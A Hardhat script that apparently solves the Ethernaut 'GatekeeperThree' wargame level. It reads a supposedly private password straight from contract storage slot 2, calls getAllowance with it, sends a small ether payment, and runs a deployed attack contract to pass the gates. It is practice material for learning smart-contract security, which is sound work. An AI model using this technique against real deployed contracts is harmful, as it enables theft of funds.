const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x1F1d359DF36Eba827aa9dc94Aa6622fAb70447Fc";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("GatekeeperThree");
  const contract = Contract.attach(instanceAddress);

  const AttackContract = await ethers.getContractFactory(
    "GatekeeperThreeAttack"
  );
  const attackContract = await AttackContract.deploy(instanceAddress);
  await attackContract.deployed();

  // Attack

  let tx = await contract.createTrick();
  await tx.wait();

  const trickContractAddr = await contract.trick();
  const password = await ethers.provider.getStorageAt(trickContractAddr, 2);

  tx = await contract.getAllowance(password);
  await tx.wait();

  const txData = {
    to: instanceAddress,
    value: ethers.utils.parseEther("0.0011"),
  };
  tx = await attacker.sendTransaction(txData);
  await tx.wait();

  await attackContract.attack();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
